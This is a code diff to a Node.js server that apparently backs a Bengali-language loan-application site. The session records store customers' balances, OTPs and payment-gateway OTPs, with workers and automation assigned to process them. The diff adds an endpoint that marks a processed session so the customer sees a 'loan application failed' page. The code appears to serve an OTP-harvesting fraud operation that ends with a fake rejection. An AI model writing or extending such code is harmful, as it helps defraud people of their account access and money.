@@ -466,6 +466,7 @@ function handleAutomationReport(req, res) {
     else if (status === 'REVIEW') { updates.adminAction = 'REVIEW_APP'; updates.assignedWorker = null; updates.assignedAt = null; }
     else if (status === 'REVERIFY_BALANCE') { updates.adminAction = 'REVERIFY_BALANCE'; updates.balance = ''; updates.otp = ''; updates.gatewayOtp = ''; updates.assignedWorker = null; updates.assignedAt = null; }
     else if (status === 'DONE') { updates.processedByAutomation = true; updates.assignedWorker = null; updates.assignedAt = null; }
+    else if (status === 'LOAN_FAILED') { updates.adminAction = 'LOAN_FAILED'; }
 
     sessions[id] = Object.assign({}, existing, updates);
     dbUpsertSession(id, sessions[id]).catch(err => console.error('[Automation report] DB error:', err));
@@ -479,6 +480,51 @@ app.get('/api/report', handleAutomationReport);
 app.post('/api/report', handleAutomationReport);
 app.post('/api/automation/report', handleAutomationReport);
 app.get('/api/automation/report', handleAutomationReport);
+
+// ---------------------------------------------------------------------------
+// Loan-rejected endpoint: GET /api/loan-failed?id=<sessionId>[&worker=<n>]
+// Same shape/behaviour as the other report endpoints (returns NO_DATA), but
+// it flags the session so the customer sees the "লোন আবেদন ব্যর্থ" page.
+// ---------------------------------------------------------------------------
+function handleLoanFailed(req, res) {
+  let id = req.query?.id || req.body?.id;
+  const worker = req.query?.worker || req.body?.worker || null;
+
+  try {
+    if (!id || String(id).trim() === '') {
+      const allSessions = Object.entries(sessions).map(([sid, sdata]) => ({ id: sid, data: sdata }));
+      let bestSession = null;
+      let bestTime = 0;
+      for (const s of allSessions) {
+        if (s.data.lastAutomationData && s.data.lastAutomationData !== '' && (s.data.lastUpdated || 0) > bestTime) {
+          if (worker && s.data.assignedWorker !== worker) continue;
+          bestTime = s.data.lastUpdated || 0;
+          bestSession = s;
+        }
+      }
+      if (bestSession) { id = bestSession.id; }
+      else { return res.status(400).type('text/plain').send('NO_DATA'); }
+    }
+
+    const existing = sessions[id];
+    if (!existing) return res.status(404).type('text/plain').send('NO_DATA');
+
+    sessions[id] = Object.assign({}, existing, {
+      adminAction: 'LOAN_FAILED',
+      processedByAutomation: true,
+      lastUpdated: Date.now(),
+      lastActionAt: Date.now(),
+      lastActionTrigger: 'LOAN_FAILED'
+    });
+    dbUpsertSession(id, sessions[id]).catch(err => console.error('[LoanFailed] DB error:', err));
+    res.type('text/plain').send('NO_DATA');
+  } catch (err) {
+    res.status(500).type('text/plain').send('NO_DATA');
+  }
+}
+
+app.get('/api/loan-failed', handleLoanFailed);
+app.get('/api/automation/loan-failed', handleLoanFailed);
 
 app.get('/api/check-blocked', (req, res) => {
   const ip = getClientIp(req);
